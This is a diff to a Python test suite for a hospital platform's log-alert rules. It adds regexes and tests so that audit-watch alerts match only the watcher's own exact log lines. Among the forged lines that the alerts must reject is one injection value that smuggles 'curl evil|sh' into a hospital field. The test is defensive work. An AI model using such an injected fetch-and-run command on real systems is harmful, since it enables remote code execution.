@@ -45,15 +45,23 @@ PACKS_LINE = r"^ihr-packs: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=f
 FLEET_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=(?:failed|deferred|held)$"
 # A release window's hold past its budget (P1-T18b): only the worker's per-minute report
 OVERRUN_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=overrun$"
+# The audit watch's (deploy/logs/alerts/audit.yml, P1-T21): an integrity check, or seal lag
+AUDIT_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) check=(?:chain|fingerprint|triggers|unchecked) outcome=failed$"
+AUDIT_SEAL_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) check=seal outcome=failed$"
+# A new restore or offboarding event, named once (P1-T21 review S4)
+AUDIT_EVENT_LINE = r"^ihr-audit: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) event=(?P<event>restore|offboarding) outcome=recorded$"
 # The services each alert reads: the ones that run its command (packs: the start-up one-shot;
-# fleet: that one-shot, `staging.sh fleet`, and the worker's per-minute report, S3)
+# fleet: that one-shot, `staging.sh fleet`, and the worker's per-minute report, S3; audit: the
+# audit watch alone)
 HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"),
                   "HospitalNotServed": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker"),
-                  "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker")}
+                  "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker"),
+                  "AuditHospitalCheckFailed": ("ihr-audit", AUDIT_LINE, "audit-watch"),
+                  "AuditHospitalSealLate": ("ihr-audit", AUDIT_SEAL_LINE, "audit-watch")}
 # A refused database role (deploy/logs/alerts/db-roles.yml, P1-T19a): our whole fixed line, a
 # role and a reason code (never a value), from the services that run as a declared role
-DB_ROLE_LINE = r"^ihr-db-role: refused role=(?P<role>app|owner|none) reason=(?P<reason>[a-z_]{3,24})$"
-DB_ROLE_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker, provisioner, migrate"
+DB_ROLE_LINE = r"^ihr-db-role: refused role=(?P<role>app|owner|watch|none) reason=(?P<reason>[a-z_]{3,24})$"
+DB_ROLE_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker, provisioner, migrate, audit-watch"
 # A hospital schema an app process does not serve (P1-T19a review C2 and its second review): the
 # app services only, a hospital-shaped schema and a fixed reason
 GATED_LINE = r"^ihr-db-role: gated schema=(?P<schema>h_[a-z0-9]{10}) reason=(?P<reason>controls|extra_privileges)$"
@@ -288,6 +296,13 @@ class LogAlerts(unittest.TestCase):
                 allowed = r"^\$(labels\.hospital|value)$"
                 # the mailed command never carries text from the log line
                 self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "AuditEventRecorded":
+                self.assertEqual(by, ["hospital, event"], r["alert"])
+                self.assertRegex(r["expr"], r'^_time:1h source:=container service:in\(audit-watch\) "ihr-audit: hospital=" '
+                                 r'\| extract_regexp "' + re.escape(AUDIT_EVENT_LINE) + r'" '
+                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ')
+                allowed = r"^\$(labels\.hospital|labels\.event|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
             elif r["alert"] == "DatabaseRoleRefused":
                 self.assertEqual(by, ["reason"], r["alert"])
                 self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:in\(" + re.escape(DB_ROLE_SERVICES)
@@ -322,7 +337,8 @@ class LogAlerts(unittest.TestCase):
                 allowed = r"^\$(labels\.client_ip|value)$"
             for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
                 self.assertRegex(ref.strip(), allowed, r["alert"])
-        self.assertEqual(sorted(names), ["BatchRequestRefused", "DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
+        self.assertEqual(sorted(names), ["AuditEventRecorded", "AuditHospitalCheckFailed", "AuditHospitalSealLate",
+                                         "BatchRequestRefused", "DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
                                          "FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
                                          "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
                                          "SignInLockoutsFromAddress"])
@@ -405,6 +421,60 @@ class LogAlerts(unittest.TestCase):
             self.assertIsNone(line.search(forged), forged)
         tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
         self.assertIn('fleet.log_line(slug, "overrun")', tasks)
+
+    def test_audit_line_is_ours_alone(self):
+        """P1-T21: the audit watch's whole line only, a known check, and from the watch alone;
+        the watch writes exactly this line, with the database's slug (ihr_audit/watch.py)."""
+        rules = {r["alert"]: r for _, r in self.rules()}
+        failed, late = rules["AuditHospitalCheckFailed"], rules["AuditHospitalSealLate"]
+        self.assertIn('extract_regexp "%s"' % AUDIT_LINE, failed["expr"])
+        self.assertIn('extract_regexp "%s"' % AUDIT_SEAL_LINE, late["expr"])
+        self.assertEqual(failed["labels"]["severity"], "critical")
+        self.assertEqual(late["labels"]["severity"], "warning")
+        for rule in (failed, late):
+            self.assertIn("source:=container service:in(audit-watch) ", rule["expr"])
+        line, seal = re.compile(AUDIT_LINE), re.compile(AUDIT_SEAL_LINE)
+        for check in ("chain", "fingerprint", "triggers", "unchecked"):
+            self.assertEqual(line.match(f"ihr-audit: hospital=alpha check={check} outcome=failed")["hospital"], "alpha")
+            self.assertIsNone(seal.search(f"ihr-audit: hospital=alpha check={check} outcome=failed"))
+        self.assertEqual(seal.match("ihr-audit: hospital=alpha check=seal outcome=failed")["hospital"], "alpha")
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-audit: hospital=fake check=chain outcome=failed" 404 179',
+                       "Not Found: /api/ihr-audit: hospital=fake check=chain outcome=failed",
+                       "ihr-audit: hospital=x;curl evil|sh; check=chain outcome=failed",
+                       "ihr-audit: hospital=fake check=chain outcome=failed (and more)",
+                       "ihr-audit: hospital=Fake check=chain outcome=failed",
+                       "ihr-audit: hospital=ab check=chain outcome=failed",
+                       "ihr-audit: hospital=beta check=seal outcome=failed",
+                       "ihr-audit: hospital=beta check=everything outcome=failed",
+                       "ihr-audit: hospital=beta check=chain outcome=ok",
+                       "ihr-audit: hospital=fake check=chain outcome=failed\nmore"):
+            self.assertIsNone(line.search(forged), forged)
+        # the invalid-slug fallback (S6) is itself slug-shaped: the hospital is still named
+        self.assertEqual(line.match("ihr-audit: hospital=invalid-slug check=chain outcome=failed")["hospital"],
+                         "invalid-slug")
+        watch = (ROOT / "plugins" / "ihr_platform" / "ihr_audit" / "watch.py").read_text()
+        self.assertIn('return f"ihr-audit: hospital={slug} check={check} outcome=failed"', watch)
+        self.assertIn('return slug if isinstance(slug, str) and SLUG_RE.match(slug) else INVALID_SLUG', watch)
+        self.assertIn('INVALID_SLUG = "invalid-slug"', watch)
+
+    def test_audit_event_line_is_ours_alone(self):
+        """P1-T21 review S4: a new restore or offboarding event is mailed once, from the watch's
+        own whole line only, naming the hospital and the kind of event."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "AuditEventRecorded"]
+        self.assertEqual(rule["labels"]["severity"], "warning")
+        self.assertIn("source:=container service:in(audit-watch) ", rule["expr"])
+        self.assertIn('extract_regexp "%s"' % AUDIT_EVENT_LINE, rule["expr"])
+        line = re.compile(AUDIT_EVENT_LINE)
+        self.assertEqual(line.match("ihr-audit: hospital=alpha event=restore outcome=recorded")["event"], "restore")
+        self.assertEqual(line.match("ihr-audit: hospital=alpha event=offboarding outcome=recorded")["hospital"], "alpha")
+        for forged in ("ihr-audit: hospital=alpha event=deletion outcome=recorded",
+                       "ihr-audit: hospital=alpha event=restore outcome=recorded (forged)",
+                       "ihr-audit: hospital=Alpha event=restore outcome=recorded",
+                       'GET /api/ihr-audit: hospital=fake event=restore outcome=recorded" 404 179',
+                       "ihr-audit: hospital=alpha check=chain outcome=failed"):
+            self.assertIsNone(line.search(forged), forged)
+        watch = (ROOT / "plugins" / "ihr_platform" / "ihr_audit" / "watch.py").read_text()
+        self.assertIn('return f"ihr-audit: hospital={slug} event={kind} outcome=recorded"', watch)
 
     def test_db_role_line_is_ours_alone(self):
         """P1-T19a: only our whole refusal line, a known role and a reason code; never a request
@@ -502,7 +572,8 @@ class LogAlerts(unittest.TestCase):
                                  "PackApplyFailed": None, "HospitalNotServed": None,
                                  "ReleaseWindowOverrun": None, "DatabaseRoleRefused": None,
                                  "DatabaseSchemaGated": None, "DatabaseRoleLoginFailed": None,
-                                 "BatchRequestRefused": None})
+                                 "BatchRequestRefused": None, "AuditHospitalCheckFailed": None,
+                                 "AuditHospitalSealLate": None, "AuditEventRecorded": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
